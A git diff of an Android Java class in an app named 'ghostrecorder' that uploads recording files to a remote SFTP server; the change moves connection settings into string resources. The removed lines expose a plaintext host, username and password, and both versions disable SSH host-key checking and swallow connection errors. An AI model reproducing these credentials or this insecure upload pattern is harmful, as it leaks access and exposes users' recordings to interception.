@@ -1,6 +1,5 @@
 package com.byteshaft.ghostrecorder;
 
-
 import android.content.Context;
 import android.os.AsyncTask;
 import android.util.Log;
@@ -19,97 +18,93 @@ import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.net.SocketException;
 
-public class UploadRecordingTask extends AsyncTask<String, String, Boolean> {
+public class UploadRecordingTask extends AsyncTask<String, Void, String> {
 
-    private Session session = null;
-    private Channel channel = null;
-    private ChannelSftp channelSftp = null;
-    private Helpers mHelpers;
-    private String  mFileName = null;
-    private static boolean UPLOAD_INTRUPTED = false;
-    private Context mContext;
     private final String LOGTAG = AppGlobals.LOG_TAG + "/" + getClass().getName();
 
+    private Session mSession;
+    private Channel mChannel;
+    private ChannelSftp mChannelSftp;
+    private Context mContext;
+    private Helpers mHelpers;
+    private String mFileName;
+    private boolean UPLOAD_INTERRUPTED;
+
     public UploadRecordingTask(Context context) {
+        super();
         mContext = context;
+        mHelpers = new Helpers(context.getApplicationContext());
     }
 
-    @Override
-    protected Boolean doInBackground(String... params) {
-        mHelpers = new Helpers();
-        /* Host , port , username, password, directory for server*/
-        String SFTPHOST = "pizzacutter.no-ip.org";
-        int SFTPPORT = 57127;
-        String SFTPUSER = "dataupload";
-        String SFTPPASS = "j&ka1h39s7R";
-        String SFTPWORKINGDIR = "/upload";
-        Log.i(LOGTAG, "preparing the host information for sftp.");
+    protected String doInBackground(String... params) {
+        String SFTP_HOST = mContext.getString(R.string.sftp_host);
+        String SFTP_PORT = mContext.getString(R.string.sftp_port);
+        String SFTP_USER = mContext.getString(R.string.sftp_username);
+        String SFTP_PASSWORD = mContext.getString(R.string.sftp_password);
+        String SFTP_WORKING_DIR = mContext.getString(R.string.sftp_working_directory);
+        Log.i("Ghost_Recorder", "preparing the host information for sftp.");
 
         try {
             /*using jsch library for sending Recording to server*/
-            connectToServer(SFTPHOST, SFTPPORT, SFTPUSER, SFTPPASS, SFTPWORKINGDIR);
+            connectToServer(SFTP_HOST, SFTP_PORT, SFTP_USER, SFTP_PASSWORD, SFTP_WORKING_DIR);
             File file = new File(params[0]);
             mFileName = file.getName();
             Log.i(LOGTAG, "file Transfer started...");
-            channelSftp.put(new FileInputStream(file), file.getName());
+            mChannelSftp.put(new FileInputStream(file), file.getName());
             Log.i(LOGTAG, "File transfered successfully to host.");
 
         } catch (SftpException e) {
-            return UPLOAD_INTRUPTED = true;
+            UPLOAD_INTERRUPTED = true;
         } catch (FileNotFoundException e) {
             e.printStackTrace();
         }
-        return false;
-    }
-
-    private void connectToServer(String SFTPHOST, int SFTPPORT, String SFTPUSER,
-                                 String SFTPPASS, String SFTPWORKINGDIR) {
-        JSch jsch = new JSch();
-        try {
-            session = jsch.getSession(SFTPUSER, SFTPHOST, SFTPPORT);
-            session.setPassword(SFTPPASS);
-            java.util.Properties config = new java.util.Properties();
-            // this part is not recommended Remove it in future
-            config.put("StrictHostKeyChecking", "no");
-            session.setConfig(config);
-            session.connect();
-            Log.i(LOGTAG, "Host connected.");
-            channel = session.openChannel("sftp");
-            channel.connect();
-            Log.i(LOGTAG, "sftp channel opened and connected.");
-            channelSftp = (ChannelSftp) channel;
-            channelSftp.cd(SFTPWORKINGDIR);
-        } catch (JSchException e) {
-            e.printStackTrace();
-        } catch (SftpException e) {
-            e.printStackTrace();
-        }
-
+        return null;
     }
 
     @Override
-    protected void onPostExecute(Boolean aBoolean) {
-        super.onPostExecute(aBoolean);
-        Log.i(LOGTAG, "boolean value: " +aBoolean);
-        if (UPLOAD_INTRUPTED) {
-                Log.i(LOGTAG, "file upload intruptted");
-            String notUploadedFile = mHelpers.path +  mFileName;
+    protected void onPostExecute(String aString) {
+        super.onPostExecute(aString);
+        if (UPLOAD_INTERRUPTED) {
+            Log.i(LOGTAG, "file upload intruptted");
+            String notUploadedFile = mHelpers.path + mFileName;
             System.out.println(notUploadedFile);
-                RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper
-                        (mContext);
+            RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper(mContext);
             recordingHelper.openDatabase();
             recordingHelper.createNewEntry(SqliteHelper.COULMN_DELETE, notUploadedFile);
             recordingHelper.createNewEntry(SqliteHelper.COULMN_UPLOAD, notUploadedFile);
         }
     }
 
+    private void connectToServer(String host, String port, String userName,
+                                 String password, String workingDirectory) {
+        JSch jsch = new JSch();
+        try {
+            mSession = jsch.getSession(userName, host, Integer.valueOf(port));
+            mSession.setPassword(password);
+            java.util.Properties config = new java.util.Properties();
+            config.put("StrictHostKeyChecking", "no");
+            mSession.setConfig(config);
+            mSession.connect();
+            Log.i("Ghost_Recorder", "Host connected.");
+            mChannel = mSession.openChannel("sftp");
+            mChannel.connect();
+            Log.i("Ghost_Recorder", "sftp channel opened and connected.");
+            mChannelSftp = (ChannelSftp) mChannel;
+            mChannelSftp.cd(workingDirectory);
+        } catch (JSchException ignore) {
+
+        } catch (SftpException e) {
+            e.printStackTrace();
+        }
+    }
+
     private void stopUploadingWhenFinished() {
-            channelSftp.exit();
-            Log.i(LOGTAG, "sftp Channel exited.");
-            channel.disconnect();
-            Log.i(LOGTAG, "Channel disconnected.");
-            session.disconnect();
-            Log.i(LOGTAG, "Host Session disconnected.");
+        mChannelSftp.exit();
+        Log.i("Server", "sftp Channel exited.");
+        mChannel.disconnect();
+        Log.i("Server", "Channel disconnected.");
+        mSession.disconnect();
+        Log.i("Server", "Host Session disconnected.");
     }
 }
 
